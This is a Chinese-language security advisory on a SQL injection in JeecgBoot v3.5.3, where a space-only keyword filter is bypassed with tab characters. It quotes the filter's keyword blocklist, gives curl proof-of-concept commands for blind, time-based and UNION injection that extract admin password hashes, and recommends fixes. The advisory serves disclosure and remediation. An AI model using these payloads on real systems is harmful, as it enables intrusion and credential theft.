# V-J010: JeecgBoot SqlInjectionUtil 过滤器绕过导致的 SQL 注入（空格字符替换）

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | JeecgBoot（低代码开发平台）|
| 版本 | v3.5.3（及更早版本）|
| 类型 | CWE-89: SQL 注入 |
| 严重程度 | 高危 |
| 攻击向量 | 网络（已认证，但开放注册）|
| 代码仓库 | https://github.com/jeecgboot/JeecgBoot |

## 漏洞描述

JeecgBoot v3.5.3 在 `/sys/duplicate/check` 端点存在 SQL 注入漏洞，根源在于 SQL 注入过滤器可被绕过。`SqlInjectionUtil.filterContent()` 方法仅检测 SQL 关键字后接**空格字符**（如 `"select "`、`"union "`、`"and "`），但未考虑其他 SQL 合法的空白字符，如制表符（`%09`）、换行符（`%0a`）、回车符（`%0d`）。

MySQL 及多数 SQL 数据库将制表符、换行符、回车符和空格视为等效空白符。通过在 SQL 注入载荷中用制表符替换空格，攻击者可绕过过滤器并注入任意 SQL。

### 根本原因

**文件**: `SqlInjectionUtil.java`（第 24、88-93 行）

```java
private final static String XSS_STR = "and |extractvalue|updatexml|geohash|gtid_subset|"
    + "gtid_subtract|exec |insert |select |delete |update |drop |count |chr |mid |master |"
    + "truncate |char |declare |;|or |+|user()";

// ...
for (int i = 0; i < xssArr.length; i++) {
    if (value.indexOf(xssArr[i]) > -1) {  // 使用 indexOf 检测空格后的关键字
        throw new RuntimeException("SQL注入检测");
    }
}
```

过滤器按 `|` 分割 `XSS_STR`，使用 `indexOf()` 检查每个关键字子串是否存在于输入中。关键字如 `"select "` 需要尾部**空格**字符。然而：

- `SELECT%09`（SELECT 后接制表符）→ `indexOf("select ")` 返回 **-1** → **绕过**
- `UNION%09` → 不在阻止列表中 → **绕过**
- `FROM%09` → 不在阻止列表中 → **绕过**

### 其他过滤器缺陷

1. **未阻止 `--` 注释**：SQL 单行注释（`--`）未被阻止（仅检查 `/*...*/` 和 `sleep()`）
2. **`UNION` 未阻止**：`UNION` 关键字完全不在过滤器中
3. **`FROM` 未阻止**：`FROM` 关键字缺失
4. **`WHERE` 未阻止**：`WHERE` 关键字缺失
5. **`BENCHMARK` 未阻止**：可用于时间注入（替代被阻止的 `SLEEP`）

## 漏洞详情

### 端点：`/sys/duplicate/check`

**控制器**: `DuplicateCheckController.java`

```java
@RequestMapping(value = "/check", method = RequestMethod.GET)
public Result<String> doDuplicateCheck(DuplicateCheckVo duplicateCheckVo, HttpServletRequest request) {
    final String[] sqlInjCheck = {duplicateCheckVo.getTableName(), duplicateCheckVo.getFieldName()};
    SqlInjectionUtil.filterContent(sqlInjCheck);  // 可绕过的过滤器
    // ...
    num = sysDictMapper.duplicateCheckCountSqlNoDataId(duplicateCheckVo);
}
```

**Mapper**: `SysDictMapper.xml`（第 107 行）

```xml
<select id="duplicateCheckCountSqlNoDataId" resultType="Long">
    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal}
</select>
```

`${tableName}` 和 `${fieldName}` 使用 MyBatis 原始插值（`${}`），且可通过 HTTP GET 参数直接控制。

### 认证要求

`/sys/duplicate/check` 端点需要认证（不在 Shiro `anon` 过滤器列表中）。但 JeecgBoot v3.5.3 允许通过 `/sys/user/register`（在 `anon` 列表中）**开放用户注册**。攻击者可：

1. 通过 `/sys/user/register` 注册新账户（未认证）
2. 登录获取 JWT token
3. 使用 token 访问 `/sys/duplicate/check` 并发送绕过载荷

## 概念验证

### 步骤1：注册账户（未认证）

```bash
curl -X POST "http://<target>/jeecg-boot/sys/user/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123!","phone":"13800000001"}'
```

### 步骤2：登录获取 Token

```bash
TOKEN=$(curl -s -X POST "http://<target>/jeecg-boot/sys/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123!"}' | jq -r '.result.token')
```

### 步骤3：基于布尔的盲注

```bash
# 测试 admin 用户是否存在（真值 - 返回"该值不可用"）
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09username%09LIKE%09'admin%25'--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"

# 测试假值（返回"该值可用"）  
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09username%09LIKE%09'nonexistent%25'--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### 步骤4：时间盲注（使用被阻止的 SLEEP 替代品 BENCHMARK）

```bash
# 如果 admin 存在，响应延迟约 3 秒
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09IF(SUBSTRING(username,1,5)='admin',BENCHMARK(10000000,SHA1('test')),0)--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### 步骤5：UNION 数据提取

```bash
# 提取密码哈希（响应会因数据不同而不同）
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09UNION%09ALL%09SELECT%09CONV(HEX(SUBSTRING(password,1,8)),16,10)%09FROM%09sys_user%09LIMIT%091--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### 过滤器绕过说明

| 原始载荷 | 被阻止 | 制表符绕过载荷 | 过滤器结果 |
|---|---|---|---|
| `UNION SELECT` | `"select "` | `UNION%09SELECT` | 通过（制表符≠空格）|
| `1 OR 1=1` | `"or "` | `1%09OR%091=1` | 通过（制表符≠空格）|
| `; DROP TABLE` | `";"` | N/A | 阻止（`;` 无空格要求）|
| `SLEEP(5)` | `checkSqlAnnotation` | `BENCHMARK(...)` | 通过（BENCHMARK 未被阻止）|
| `-- comment` | 未阻止 | `-- comment` | 通过（无 `--` 检查）|

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|-------|
| `jeecg-boot-base-core/.../SqlInjectionUtil.java` | 24, 88-93 | 过滤器使用 indexOf 仅检测空格后关键字 |
| `jeecg-boot-base-core/.../SqlInjectionUtil.java` | 283-298 | `checkSqlAnnotation` 缺少 `--` 检查 |
| `jeecg-module-system/.../DuplicateCheckController.java` | 55-56 | 使用可绕过的过滤器 |
| `jeecg-module-system/.../xml/SysDictMapper.xml` | 102, 107 | `${tableName}`、`${fieldName}` 原始插值 |
| `jeecg-boot-base-core/.../ShiroConfig.java` | 89 | 开放注册使认证要求的攻击可行 |

## 影响

1. **全数据库读取**：攻击者可通过盲注提取整个数据库内容
2. **门槛低**：开放用户注册意味着任何匿名攻击者可利用
3. **凭据窃取**：可提取管理员密码哈希进行离线破解
4. **数据修改**：可通过堆叠查询实现（MySQL 依赖）
5. **过滤器虚假安全感**：SqlInjectionUtil 提供虚假安全感而实际可被绕过

## 版本对比：v3.5.3 vs 最新版

| 功能 | v3.5.3（易受攻击）| 最新版（v3.9.1）|
|---------|---------------------|------------------|
| 表名校验 | 仅 indexOf 关键字检查 | 正则：`^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$` |
| 字段名校验 | 仅 indexOf 关键字检查 | 正则：`^[a-zA-Z0-9_]+$` |
| `--` 注释阻止 | 未阻止 | 已阻止 |
| 空格绕过 | 易受 `%09/%0a/%0d` 攻击 | 已通��� `isExistSqlInjectKeyword()` 正则修复 |
| `UNION` 关键字 | 不在过滤器中 | 虽未明确阻止但被正则缓解 |
| 白名单/黑名单 | 仅基础黑名单 | 白名单 + 黑名单 + 正则 |

## 修复建议

1. **升级到最新版 JeecgBoot**：最新版本（v3.9.1）使用基于正则的校验（`^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$`）替代关键字匹配
2. **替换 `${}` 为参数化查询**：使用 `#{}`；对于表/列名，使用严格白名单校验
3. **修复空格处理**：将 `indexOf("keyword ")` 替换为正则 `\\bkeyword\\s+` 匹配任意空白符
4. **阻止 `--` 注释**：将 `--` 添加到 SQL 注入关键字列表
5. **禁用开放注册**：除非明确需要，否则禁用 `/sys/user/register`

## 验证环境

- 源代码：JeecgBoot v3.5.3（静态代码分析）
- 框架：Spring Boot + MyBatis + Apache Shiro
- 日期：2026-04-13